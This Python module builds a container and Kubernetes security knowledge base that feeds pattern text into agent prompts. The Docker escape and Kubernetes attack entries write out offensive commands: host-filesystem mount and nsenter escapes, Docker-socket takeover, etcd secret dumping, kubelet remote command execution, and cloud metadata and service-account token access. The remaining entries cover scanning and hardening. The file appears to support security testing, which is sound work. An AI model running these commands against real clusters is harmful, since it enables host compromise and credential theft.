"""Container security knowledge base.

Deep knowledge about container and Kubernetes security:
1. Docker escape techniques
2. Kubernetes cluster attacks
3. Container image vulnerabilities
4. Runtime security
5. Service mesh and network policy
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class ContainerPattern:
    """A container security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


CONTAINER_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "cont-001", "name": "Docker Escape",
        "category": "escape", "severity": "critical",
        "desc": "Docker container escape techniques.",
        "detection": (
            "DOCKER ESCAPE:\n"
            "PRIVILEGED CONTAINER:\n"
            "  # Check: docker inspect | grep Privileged\n"
            "  # Full host access if privileged=true\n"
            "  mount /dev/sda1 /mnt  # Mount host filesystem\n"
            "  chroot /mnt  # Escape to host\n"
            "  nsenter --target 1 --mount --uts --ipc --net --pid  # Enter host namespaces\n"
            "DANGEROUS CAPABILITIES:\n"
            "  # SYS_ADMIN: mount, sysctl, etc.\n"
            "  # SYS_PTRACE: Process injection\n"
            "  # NET_ADMIN: Network manipulation\n"
            "  # DAC_READ_SEARCH: Read any file\n"
            "  capsh --print  # Check capabilities\n"
            "DOCKER SOCKET:\n"
            "  # If /var/run/docker.sock is mounted\n"
            "  docker -H unix:///var/run/docker.sock run -it --privileged --pid=host ubuntu bash\n"
            "  # Full host control via Docker API\n"
            "CGROUP ESCAPE:\n"
            "  # CVE-2022-0492: Unshare + mount cgroup\n"
            "  # Release_agent exploitation\n"
            "RUNC ESCAPE:\n"
            "  # CVE-2024-21626 (Leaky Vessels)\n"
            "  # CVE-2019-5736 (runc overwrite)\n"
            "KERNEL EXPLOITS:\n"
            "  # Container shares host kernel\n"
            "  # Dirty Pipe, Dirty COW, etc.\n"
            "DETECTION:\n"
            "  cat /proc/1/cgroup  # Am I in a container?\n"
            "  ls /.dockerenv  # Docker indicator\n"
            "  mount | grep docker  # Check mounts"
        ),
        "tools": ["deepce", "cdkexec"],
    },
    {
        "id": "cont-002", "name": "Kubernetes Attacks",
        "category": "k8s", "severity": "critical",
        "desc": "Kubernetes cluster attack techniques.",
        "detection": (
            "KUBERNETES ATTACKS:\n"
            "RBAC EXPLOITATION:\n"
            "  kubectl auth can-i --list  # Check permissions\n"
            "  # Overly permissive: * verbs on * resources\n"
            "  # Service account token: /var/run/secrets/kubernetes.io/serviceaccount/token\n"
            "  # Access API server with SA token\n"
            "POD ESCAPE:\n"
            "  # hostPID: true → See host processes\n"
            "  # hostNetwork: true → Host network access\n"
            "  # hostPath: Mount host filesystem\n"
            "  # privileged: true → Full host access\n"
            "ETCD:\n"
            "  # etcd stores all cluster state/secrets\n"
            "  etcdctl get --prefix /registry/secrets/\n"
            "  # Often unencrypted, accessible if misconfigured\n"
            "KUBELET API:\n"
            "  # Port 10250 (kubelet)\n"
            "  curl https://<node>:10250/pods/\n"
            "  curl https://<node>:10250/run/<namespace>/<pod>/<container> -d 'cmd=id'\n"
            "  # If anonymous auth enabled → RCE on any pod\n"
            "SERVICE ACCOUNT ABUSE:\n"
            "  # Default SA often has excessive permissions\n"
            "  # Mount custom SA token in pod\n"
            "  # Lateral movement via SA tokens\n"
            "METADATA API:\n"
            "  curl http://169.254.169.254/latest/meta-data/  # From pod\n"
            "  # Cloud provider IAM roles\n"
            "TOOLS:\n"
            "  kube-hunter  # K8s penetration testing\n"
            "  kubeaudit  # Security auditing\n"
            "  peirates  # K8s penetration testing\n"
            "  kubectl-who-can  # RBAC analysis"
        ),
        "tools": ["kube-hunter", "kubeaudit", "peirates"],
    },
    {
        "id": "cont-003", "name": "Image Vulnerabilities",
        "category": "image", "severity": "high",
        "desc": "Container image vulnerability analysis.",
        "detection": (
            "IMAGE VULNERABILITIES:\n"
            "SCANNING:\n"
            "  trivy image <image>  # Comprehensive scanner\n"
            "  grype <image>  # Anchore vulnerability scanner\n"
            "  snyk container test <image>  # Snyk scanner\n"
            "  docker scout cves <image>  # Docker Scout\n"
            "COMMON ISSUES:\n"
            "  - Outdated base images (Ubuntu, Alpine)\n"
            "  - Known CVEs in packages\n"
            "  - Hardcoded secrets in layers\n"
            "  - Running as root\n"
            "  - Unnecessary packages installed\n"
            "LAYER ANALYSIS:\n"
            "  dive <image>  # Explore image layers\n"
            "  docker history <image>  # Layer history\n"
            "  # Extract secrets from intermediate layers\n"
            "  docker save <image> | tar -xf -\n"
            "  # Search each layer for credentials\n"
            "SUPPLY CHAIN:\n"
            "  - Typosquatting on Docker Hub\n"
            "  - Compromised base images\n"
            "  - Build pipeline injection\n"
            "  - Unsigned images\n"
            "  cosign verify <image>  # Verify signatures\n"
            "  # Content trust: DOCKER_CONTENT_TRUST=1\n"
            "BEST PRACTICES:\n"
            "  - Use minimal base (distroless, scratch)\n"
            "  - Multi-stage builds\n"
            "  - No secrets in Dockerfile\n"
            "  - Non-root user\n"
            "  - Read-only filesystem"
        ),
        "tools": ["trivy", "grype", "dive"],
    },
    {
        "id": "cont-004", "name": "Runtime Security",
        "category": "runtime", "severity": "high",
        "desc": "Container runtime security monitoring.",
        "detection": (
            "RUNTIME SECURITY:\n"
            "SYSCALL MONITORING:\n"
            "  # Falco: Runtime security monitoring\n"
            "  falco  # Detect abnormal behavior\n"
            "  # Rules: shell in container, crypto mining, etc.\n"
            "  # Custom rules for specific threats\n"
            "SECCOMP:\n"
            "  # Restrict syscalls available to container\n"
            "  # Default profile blocks dangerous syscalls\n"
            "  # Custom profiles for specific workloads\n"
            "  docker run --security-opt seccomp=profile.json\n"
            "APPARMOR / SELINUX:\n"
            "  # Mandatory access control\n"
            "  # AppArmor profiles restrict container actions\n"
            "  docker run --security-opt apparmor=profile\n"
            "READ-ONLY FILESYSTEM:\n"
            "  docker run --read-only\n"
            "  # Prevents file writes (malware, web shells)\n"
            "  # Use tmpfs for writable dirs\n"
            "NETWORK POLICIES:\n"
            "  # Kubernetes NetworkPolicy\n"
            "  # Default deny all ingress/egress\n"
            "  # Whitelist specific pod communication\n"
            "  # Calico, Cilium for advanced policies\n"
            "POD SECURITY:\n"
            "  # Pod Security Standards (Restricted/Baseline/Privileged)\n"
            "  # Pod Security Admission (PSA)\n"
            "  # OPA Gatekeeper / Kyverno for policy\n"
            "DETECTION:\n"
            "  # Falco alerts\n"
            "  # Audit logging (kube-apiserver)\n"
            "  # Container drift detection"
        ),
        "tools": ["falco", "trivy"],
    },
    {
        "id": "cont-005", "name": "Container Network Attacks",
        "category": "network", "severity": "high",
        "desc": "Container networking exploitation.",
        "detection": (
            "CONTAINER NETWORK ATTACKS:\n"
            "INTERNAL NETWORK:\n"
            "  # Docker default bridge: 172.17.0.0/16\n"
            "  # K8s pod network: 10.244.0.0/16 (default)\n"
            "  # Service network: 10.96.0.0/12 (default)\n"
            "  # All pods can communicate by default (no NetworkPolicy)\n"
            "SERVICE DISCOVERY:\n"
            "  # DNS: <service>.<namespace>.svc.cluster.local\n"
            "  # Environment variables: <SERVICE>_SERVICE_HOST\n"
            "  # CoreDNS enumeration\n"
            "  nslookup kubernetes.default.svc.cluster.local\n"
            "  # Enumerate services in namespace\n"
            "TRAFFIC INTERCEPTION:\n"
            "  # ARP spoofing in pod network\n"
            "  # DNS spoofing via CoreDNS manipulation\n"
            "  # Man-in-the-middle on service mesh\n"
            "  # Sidecar injection (Istio, Linkerd)\n"
            "INGRESS ATTACKS:\n"
            "  # Ingress controller vulnerabilities\n"
            "  # nginx ingress misconfigurations\n"
            "  # TLS termination issues\n"
            "  # Host header injection\n"
            "  # Path traversal in routing\n"
            "CLOUD METADATA:\n"
            "  # Access cloud provider metadata from pods\n"
            "  # IMDSv1 vs IMDSv2 (hop limit)\n"
            "  # AWS IRSA, GKE Workload Identity\n"
            "TOOLS:\n"
            "  kubeshark  # K8s network traffic viewer\n"
            "  cilium  # eBPF-based networking\n"
            "  netassert  # Network policy testing"
        ),
        "tools": ["kubeshark", "cilium"],
    },
]


class ContainerSecurityKB:
    """Container security knowledge base.

    Provides container/K8s security patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, ContainerPattern] = {}
        self._log = logger.bind(component="container_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load container patterns."""
        for data in CONTAINER_PATTERNS:
            pattern = ContainerPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[ContainerPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_container_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build container security prompt."""
        lines = ["## Container Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
